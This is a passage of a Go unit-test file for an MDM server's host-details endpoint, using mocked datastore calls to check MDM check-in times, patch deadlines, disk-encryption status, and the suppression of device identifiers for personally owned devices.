		ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
			return &automdm.NanoMDMEnrollmentDetails{
				LastMDMEnrollmentTime: &ts1,
				LastMDMSeenTime:       &ts2,
				Enabled:               true,
			}, nil
		}
		mdmOffConfig := &automdm.AppConfig{}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return mdmOffConfig, nil
		}
		defer func() {
			ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
				return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true, WindowsEnabledAndConfigured: true}}, nil
			}
		}()
		host := &automdm.Host{ID: 6, MDM: automdm.MDMHostData{}, Platform: "darwin", UUID: "mdm-off-mac-uuid"}
		hostDetail, err := svc.getHostDetails(
			test.UserContext(context.Background(), test.UserAdmin),
			host,
			automdm.HostDetailOptions{ExcludeSoftware: true},
		)
		require.NoError(t, err)
		require.True(t, ds.GetNanoMDMEnrollmentDetailsFuncInvoked, "nano read must run even when Apple MDM is off")
		require.NotNil(t, hostDetail.LastMDMCheckedInAt, "Apple MDM off must not hide LastMDMCheckedInAt on /hosts/{id}")
		require.Equal(t, ts2, *hostDetail.LastMDMCheckedInAt)
	})
}

// mockHostDetailsDatastore stubs out the datastore calls getHostDetails makes
// for every host, so that a test only has to set up the ones it asserts on.
func mockHostDetailsDatastore(ds *mock.Store) {
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
	}
	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *automdm.Host) error {
		return nil
	}
	ds.LoadHostMDMAndroidDeviceVitalsFunc = func(ctx context.Context, host *automdm.Host) error {
		return nil
	}
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) {
		return nil, nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostGoogleDeviceIDFunc = func(ctx context.Context, hostUUID, customerID string) (string, error) {
		return "", nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMAppleProfile, error) {
		return nil, nil
	}
	ds.GetHostMDMWindowsProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMWindowsProfile, error) {
		return nil, nil
	}
	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
		return automdm.DiskEncryptionConfig{}, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}
	ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMRecoveryLockPassword, error) {
		return nil, nil
	}
	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMManagedLocalAccount, error) {
		return nil, nil
	}
	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
		return nil, nil
	}
	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
		return &automdm.NanoMDMEnrollmentDetails{}, nil
	}
	ds.GetHostMDMAppleEnrollmentPermissionsFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMApplePermissions, error) {
		return nil, nil
	}
}

func TestHostDetailsPatchDeadlineAt(t *testing.T) {
	ds := new(mock.Store)
	svc := &Service{ds: ds}
	mockHostDetailsDatastore(ds)

	deadline := time.Now().UTC().Truncate(time.Second)
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return &deadline, nil
	}

	for _, tc := range []struct {
		platform string
		want     *time.Time
	}{
		{"darwin", &deadline},
		{"ios", nil},
		{"windows", nil},
		{"ubuntu", nil},
	} {
		t.Run(tc.platform, func(t *testing.T) {
			ds.GetHostPatchDeadlineAtFuncInvoked = false
			host := &automdm.Host{ID: 7, Platform: tc.platform, UUID: "patch-deadline-" + tc.platform}
			hostDetail, err := svc.getHostDetails(test.UserContext(t.Context(), test.UserAdmin), host, automdm.HostDetailOptions{ExcludeSoftware: true})
			require.NoError(t, err)
			assert.Equal(t, tc.want, hostDetail.PatchDeadlineAt)
			assert.Equal(t, tc.want != nil, ds.GetHostPatchDeadlineAtFuncInvoked)
		})
	}
}

// TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment is a regression test:
// BYOD/personal enrollments never receive the device vitals fields (see
// byodDeviceInformationQueryKeys in server/mdm/apple/commander.go), so
// getHostDetails shouldn't even load them -- both to avoid an unnecessary
// datastore call and so a personal host's response can't carry data it was
// never supposed to have.
func TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment(t *testing.T) {
	ds := new(mock.Store)
	svc := &Service{ds: ds}
	mockHostDetailsDatastore(ds)
	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *automdm.Host) error {
		host.HostMDMAppleDeviceVitals = automdm.HostMDMAppleDeviceVitals{
			PushToken: []byte("sensitive-push-token"),
		}
		return nil
	}

	personal := automdm.MDMEnrollmentStatusPersonal
	manualPersonal := automdm.MDMEnrollmentStatusManualPersonal
	manual := automdm.MDMEnrollmentStatusManual

	cases := []struct {
		name             string
		enrollmentStatus *string
		wantVitalsLoaded bool
	}{
		{"account-driven personal enrollment", &personal, false},
		{"manual personal enrollment", &manualPersonal, false},
		{"non-personal enrollment", &manual, true},
		{"unknown enrollment status", nil, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ds.LoadHostMDMAppleDeviceVitalsFuncInvoked = false
			host := &automdm.Host{
				ID:       3,
				Platform: "ipados",
				UUID:     "abc123",
				MDM:      automdm.MDMHostData{EnrollmentStatus: tc.enrollmentStatus},
			}
			opts := automdm.HostDetailOptions{ExcludeSoftware: true}
			hostDetail, err := svc.getHostDetails(test.UserContext(context.Background(), test.UserAdmin), host, opts)
			require.NoError(t, err)
			assert.Equal(t, tc.wantVitalsLoaded, ds.LoadHostMDMAppleDeviceVitalsFuncInvoked)
			if tc.wantVitalsLoaded {
				assert.Equal(t, []byte("sensitive-push-token"), hostDetail.PushToken)
			} else {
				assert.Equal(t, automdm.HostMDMAppleDeviceVitals{}, hostDetail.HostMDMAppleDeviceVitals)
			}
		})
	}
}

func TestHostDetailsAppleEnrollmentAllowedFlags(t *testing.T) {
	ds := new(mock.Store)
	svc := &Service{ds: ds}
	mockHostDetailsDatastore(ds)
	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *automdm.Host) error { return nil }

	for _, tc := range []struct {
		status        string
		personal      bool
		wantPopulated bool
	}{
		{status: automdm.MDMEnrollmentStatusPersonal, personal: true, wantPopulated: true},
		{status: automdm.MDMEnrollmentStatusManualPersonal, personal: true, wantPopulated: true},
		{status: automdm.MDMEnrollmentStatusManual, personal: false, wantPopulated: true},
		{status: automdm.MDMEnrollmentStatusAutomatic, personal: false, wantPopulated: false},
	} {
		t.Run(tc.status, func(t *testing.T) {
			ds.GetHostMDMAppleEnrollmentPermissionsFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMApplePermissions, error) {
				return &automdm.HostMDMApplePermissions{
					HostUUID:             hostUUID,
					IsPersonalEnrollment: tc.personal,
					AccessRights:         apple_mdm.AppleEnrollmentAccessRights(tc.personal),
				}, nil
			}
			host := &automdm.Host{
				ID:       3,
				Platform: "ios",
				UUID:     "abc123",
				MDM:      automdm.MDMHostData{EnrollmentStatus: new(tc.status)},
			}
			hostDetail, err := svc.getHostDetails(test.UserContext(t.Context(), test.UserAdmin), host, automdm.HostDetailOptions{ExcludeSoftware: true})
			require.NoError(t, err)

			if !tc.wantPopulated {
				require.Nil(t, hostDetail.MDM.WipeAllowed)
				require.Nil(t, hostDetail.MDM.LockAllowed)
				require.Nil(t, hostDetail.MDM.ClearPasscodeAllowed)
				return
			}
			require.NotNil(t, hostDetail.MDM.WipeAllowed)
			require.NotNil(t, hostDetail.MDM.LockAllowed)
			require.NotNil(t, hostDetail.MDM.ClearPasscodeAllowed)
			require.Equal(t, !tc.personal, *hostDetail.MDM.WipeAllowed)
			require.Equal(t, !tc.personal, *hostDetail.MDM.LockAllowed)
			require.Equal(t, !tc.personal, *hostDetail.MDM.ClearPasscodeAllowed)
		})
	}
}

// TestHostDetailsSuppressesAndroidPhoneNumberForBYOD checks that a
// personally-owned Android host never surfaces a phone number or a hardware
// radio identifier, whatever ended up stored: ingestion gates on the
// device-reported ownership, which AMAPI may omit, so the response is gated on
// AutoMDM's own enrollment record.
func TestHostDetailsSuppressesAndroidSensitiveVitalsForBYOD(t *testing.T) {
	ds := new(mock.Store)
	svc := &Service{ds: ds}
	mockHostDetailsDatastore(ds)

	ds.LoadHostMDMAndroidDeviceVitalsFunc = func(ctx context.Context, host *automdm.Host) error {
		host.HostMDMAndroidDeviceVitals = automdm.HostMDMAndroidDeviceVitals{
			Manufacturer:   new("Google"),
			IMEI:           new("A1000031212"),
			MEID:           new("A00000292788E1"),
			TelephonyInfos: []automdm.MDMAndroidTelephonyInfo{{PhoneNumber: "+15555550100"}},
		}
		return nil
	}

	personal := automdm.MDMEnrollmentStatusPersonal
	manual := automdm.MDMEnrollmentStatusManual
	off := automdm.MDMEnrollmentStatusOff

	cases := []struct {
		name                 string
		enrollmentStatus     *string
		isPersonalEnrollment bool
		wantSensitiveVitals  bool
	}{
		{"personal enrollment", &personal, true, false},
		{"company owned", &manual, false, true},
		// enrollment_status is a generated column that reads "Off" once the
		// host unenrolls, but the vitals row and the BYOD classification both
		// outlive the enrollment, so this must stay suppressed.
		{"unenrolled BYOD", &off, true, false},
		{"unenrolled company owned", &off, false, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			host := &automdm.Host{
				ID:       5,
				Platform: "android",
				UUID:     "android-byod-uuid",
				MDM: automdm.MDMHostData{
					EnrollmentStatus:     tc.enrollmentStatus,
					IsPersonalEnrollment: tc.isPersonalEnrollment,
				},
			}
			opts := automdm.HostDetailOptions{ExcludeSoftware: true}
			hostDetail, err := svc.getHostDetails(test.UserContext(t.Context(), test.UserAdmin), host, opts)
			require.NoError(t, err)
			// The other vitals load either way; only the phone number and the
			// radio identifiers are gated.
			assert.Equal(t, "Google", *hostDetail.Manufacturer)
			if tc.wantSensitiveVitals {
				assert.Len(t, hostDetail.TelephonyInfos, 1)
				assert.Equal(t, "A1000031212", *hostDetail.IMEI)
				assert.Equal(t, "A00000292788E1", *hostDetail.MEID)
			} else {
				assert.Nil(t, hostDetail.TelephonyInfos)
				assert.Nil(t, hostDetail.IMEI)
				assert.Nil(t, hostDetail.MEID)
			}
		})
	}
}

// TestHostDetailsLoadsAndroidDeviceVitals checks that the Android-only vitals
// are loaded for Android hosts and for nothing else, so that a host on another
// platform can't carry Android fields in its response.
func TestHostDetailsLoadsAndroidDeviceVitals(t *testing.T) {
	ds := new(mock.Store)
	svc := &Service{ds: ds}
	mockHostDetailsDatastore(ds)

	ds.LoadHostMDMAndroidDeviceVitalsFunc = func(ctx context.Context, host *automdm.Host) error {
		host.HostMDMAndroidDeviceVitals = automdm.HostMDMAndroidDeviceVitals{
			Manufacturer: new("Google"),
			APILevel:     new(int64(36)),
			IMEI:         new("A1000031212"),
		}
		return nil
	}

	cases := []struct {
		name             string
		platform         string
		wantVitalsLoaded bool
	}{
		{"android host", "android", true},
		{"darwin host", "darwin", false},
		{"ipados host", "ipados", false},
		{"windows host", "windows", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ds.LoadHostMDMAndroidDeviceVitalsFuncInvoked = false
			host := &automdm.Host{
				ID:       4,
				Platform: tc.platform,
				UUID:     "android-vitals-uuid",
			}
			opts := automdm.HostDetailOptions{ExcludeSoftware: true}
			hostDetail, err := svc.getHostDetails(test.UserContext(t.Context(), test.UserAdmin), host, opts)
			require.NoError(t, err)
			assert.Equal(t, tc.wantVitalsLoaded, ds.LoadHostMDMAndroidDeviceVitalsFuncInvoked)
			if tc.wantVitalsLoaded {
				assert.Equal(t, "Google", *hostDetail.Manufacturer)
				assert.Equal(t, int64(36), *hostDetail.APILevel)
				assert.Equal(t, "A1000031212", *hostDetail.IMEI)
			} else {
				assert.Equal(t, automdm.HostMDMAndroidDeviceVitals{}, hostDetail.HostMDMAndroidDeviceVitals)
			}
		})
	}
}

// Fragile test: This test is fragile because of the large reliance on Datastore mocks. Consider refactoring test/logic or removing the test. It may be slowing us down more than helping us.
func TestHostDetailsOSSettings(t *testing.T) {
	ds := new(mock.Store)
	ds.IsHostConnectedToAutoMDMMDMFunc = func(ctx context.Context, host *automdm.Host) (bool, error) {
		return true, nil
	}
	ds.ListAppleProfilesForReconcileByTeamFunc = func(ctx context.Context, teamID uint) ([]*automdm.AppleProfileForReconcile, error) {
		return nil, nil
	}
	svc := &Service{ds: ds}

	ctx := context.Background()

	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) {
		return nil, nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostMDMMacOSSetupFunc = func(ctx context.Context, hid uint) (*automdm.HostMDMMacOSSetup, error) {
		return nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}

	ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, hostID uint) (*automdm.HostDiskEncryptionKey, error) {
		return &automdm.HostDiskEncryptionKey{}, nil
	}
	ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
		return &automdm.HostArchivedDiskEncryptionKey{}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
		return &automdm.NanoMDMEnrollmentDetails{}, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}
	ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMRecoveryLockPassword, error) {
		return nil, nil
	}
	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMManagedLocalAccount, error) {
		return nil, nil
	}
	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
		return nil, nil
	}

	type testCase struct {
		name        string
		host        *automdm.Host
		licenseTier string
		wantStatus  automdm.DiskEncryptionStatus
	}
	cases := []testCase{
		{"windows", &automdm.Host{ID: 42, Platform: "windows"}, automdm.TierPremium, automdm.DiskEncryptionEnforcing},
		{"darwin", &automdm.Host{ID: 42, Platform: "darwin"}, automdm.TierPremium, ""},
		// TeamID necessary to check whether disk encryption is enabled for Linux hosts, in lieu of
		// MDM-related logic which doesn't apply to Linux hosts
		{"ubuntu", &automdm.Host{ID: 42, Platform: "ubuntu", TeamID: new(uint(1))}, automdm.TierPremium, ""},
		{"not premium", &automdm.Host{ID: 42, Platform: "windows"}, automdm.TierFree, ""},
	}

	setupDS := func(c testCase) {
		ds.AppConfigFuncInvoked = false
		ds.GetMDMWindowsBitLockerStatusFuncInvoked = false
		ds.GetHostMDMAppleProfilesFuncInvoked = false
		ds.GetHostMDMWindowsProfilesFuncInvoked = false
		ds.GetHostMDMFuncInvoked = false
		ds.GetConfigEnableDiskEncryptionFuncInvoked = false

		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true, WindowsEnabledAndConfigured: true}}, nil
		}
		ds.GetMDMWindowsBitLockerStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostMDMDiskEncryption, error) {
			if c.wantStatus == "" {
				return nil, nil
			}
			return &automdm.HostMDMDiskEncryption{Status: &c.wantStatus, Detail: ""}, nil
		}
		ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMAppleProfile, error) {
			return nil, nil
		}
		ds.GetHostMDMWindowsProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMWindowsProfile, error) {
			return nil, nil
		}
		ds.GetHostMDMFunc = func(ctx context.Context, hostID uint) (*automdm.HostMDM, error) {
			hmdm := automdm.HostMDM{Enrolled: true, IsServer: false}
			return &hmdm, nil
		}
		ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
			// testing API response when not enabled
			return automdm.DiskEncryptionConfig{}, nil
		}
		ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
			return false, nil
		}
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			setupDS(c)

			ctx = license.NewContext(ctx, &automdm.LicenseInfo{Tier: c.licenseTier})

			hostDetail, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin), c.host, automdm.HostDetailOptions{
				IncludeCVEScores: false,
				IncludePolicies:  false,
			})
			require.NoError(t, err)
			require.NotNil(t, hostDetail)
			require.True(t, ds.AppConfigFuncInvoked)

			switch c.host.Platform {
			case "windows":
				require.False(t, ds.GetHostMDMAppleProfilesFuncInvoked)
				if c.licenseTier == automdm.TierPremium {
					require.True(t, ds.GetHostMDMFuncInvoked)
				} else {
					require.False(t, ds.GetHostMDMFuncInvoked)
				}
				if c.wantStatus != "" {
					require.True(t, ds.GetMDMWindowsBitLockerStatusFuncInvoked)
					require.NotNil(t, hostDetail.MDM.OSSettings.DiskEncryption.Status)
					require.Equal(t, c.wantStatus, *hostDetail.MDM.OSSettings.DiskEncryption.Status)
				} else {
					require.False(t, ds.GetMDMWindowsBitLockerStatusFuncInvoked)
					require.Nil(t, hostDetail.MDM.OSSettings.DiskEncryption.Status)
				}
			case "ubuntu":
				require.False(t, ds.GetHostMDMAppleProfilesFuncInvoked)
				require.False(t, ds.GetMDMWindowsBitLockerStatusFuncInvoked)
				// service should call this function to check whether disk encryption is enabled for a Linux host
				require.True(t, ds.GetConfigEnableDiskEncryptionFuncInvoked)

				// Linux hosts only get OS settings via the disk-encryption (LUKS) path. When disk
				// encryption isn't enabled, OSSettings is nil — even though some other platform's MDM is
				// EnabledAndConfigured (which initializes an empty struct earlier in getHostDetails). A
				// non-nil pointer to an empty struct is NOT omitted by `omitempty`, so the service clears
				// it so the API reports no OS settings instead of an empty `os_settings: {}` object.
				require.Nil(t, hostDetail.MDM.OSSettings)

			case "darwin":
				require.True(t, ds.GetHostMDMAppleProfilesFuncInvoked)
				require.False(t, ds.GetMDMWindowsBitLockerStatusFuncInvoked)
				require.Nil(t, hostDetail.MDM.OSSettings.DiskEncryption.Status)
			default:
				require.False(t, ds.GetHostMDMAppleProfilesFuncInvoked)
				require.False(t, ds.GetMDMWindowsBitLockerStatusFuncInvoked)
			}
		})
	}
}

// Fragile test: This test is fragile because of the large reliance on Datastore mocks. Consider refactoring test/logic or removing the test. It may be slowing us down more than helping us.
func TestHostDetailsOSSettingsWindowsOnly(t *testing.T) {
	ds := new(mock.Store)
	svc := &Service{ds: ds}

	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) {
		return nil, nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostMDMMacOSSetupFunc = func(ctx context.Context, hid uint) (*automdm.HostMDMMacOSSetup, error) {
		return nil, nil
	}
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{MDM: automdm.MDM{WindowsEnabledAndConfigured: true}}, nil
	}
	ds.GetMDMWindowsBitLockerStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostMDMDiskEncryption, error) {
		verified := automdm.DiskEncryptionVerified
		return &automdm.HostMDMDiskEncryption{Status: &verified, Detail: ""}, nil
	}
	ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMAppleProfile, error) {
		return nil, nil
	}
	ds.GetHostMDMWindowsProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMWindowsProfile, error) {
		return nil, nil
	}
	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMManagedLocalAccount, error) {
		verified := string(automdm.MDMDeliveryVerified)
		return &automdm.HostMDMManagedLocalAccount{Status: &verified, PasswordAvailable: true}, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.GetHostMDMFunc = func(ctx context.Context, hostID uint) (*automdm.HostMDM, error) {
		hmdm := automdm.HostMDM{Enrolled: true, IsServer: false}
		return &hmdm, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}

	ctx := license.NewContext(context.Background(), &automdm.LicenseInfo{Tier: automdm.TierPremium})
	hostDetail, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin), &automdm.Host{ID: 42, Platform: "windows"}, automdm.HostDetailOptions{
		IncludeCVEScores: false,
		IncludePolicies:  false,
	})
	require.NoError(t, err)
	require.NotNil(t, hostDetail)
	require.True(t, ds.AppConfigFuncInvoked)
	require.False(t, ds.GetHostMDMAppleProfilesFuncInvoked)
	require.True(t, ds.GetMDMWindowsBitLockerStatusFuncInvoked)
	require.NotNil(t, hostDetail.MDM.OSSettings.DiskEncryption.Status)
	require.Equal(t, automdm.DiskEncryptionVerified, *hostDetail.MDM.OSSettings.DiskEncryption.Status)

	// The Windows host-detail path surfaces the managed local account status.
	require.True(t, ds.GetHostManagedLocalAccountStatusFuncInvoked)
	require.NotNil(t, hostDetail.MDM.OSSettings.ManagedLocalAccount.Status)
	require.Equal(t, string(automdm.MDMDeliveryVerified), *hostDetail.MDM.OSSettings.ManagedLocalAccount.Status)
	require.True(t, hostDetail.MDM.OSSettings.ManagedLocalAccount.PasswordAvailable)
}

func TestHostDetailsRecoveryLockPasswordStatus(t *testing.T) {
	ds := new(mock.Store)
	ds.IsHostConnectedToAutoMDMMDMFunc = func(ctx context.Context, host *automdm.Host) (bool, error) {
		return true, nil
	}
	ds.ListAppleProfilesForReconcileByTeamFunc = func(ctx context.Context, teamID uint) ([]*automdm.AppleProfileForReconcile, error) {
		return nil, nil
	}
	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
		return automdm.DiskEncryptionConfig{}, nil
	}
	svc := &Service{ds: ds}

	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) {
		return nil, nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostMDMMacOSSetupFunc = func(ctx context.Context, hid uint) (*automdm.HostMDMMacOSSetup, error) {
		return nil, nil
	}
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
	}
	ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMAppleProfile, error) {
		return nil, nil
	}
	ds.GetHostMDMWindowsProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMWindowsProfile, error) {
		return nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.GetHostMDMFunc = func(ctx context.Context, hostID uint) (*automdm.HostMDM, error) {
		hmdm := automdm.HostMDM{Enrolled: true, IsServer: false}
		return &hmdm, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}
	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
		return &automdm.NanoMDMEnrollmentDetails{}, nil
	}
	ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, hostID uint) (*automdm.HostDiskEncryptionKey, error) {
		return &automdm.HostDiskEncryptionKey{}, nil
	}
	ds.GetHostArchivedDiskEncryptionKeyFunc = func(ctx context.Context, host *automdm.Host, _ bool) (*automdm.HostArchivedDiskEncryptionKey, error) {
		return &automdm.HostArchivedDiskEncryptionKey{}, nil
	}

	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMManagedLocalAccount, error) {
		return nil, nil
	}
	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
		return nil, nil
	}

	t.Run("recovery lock password status populates for macOS", func(t *testing.T) {
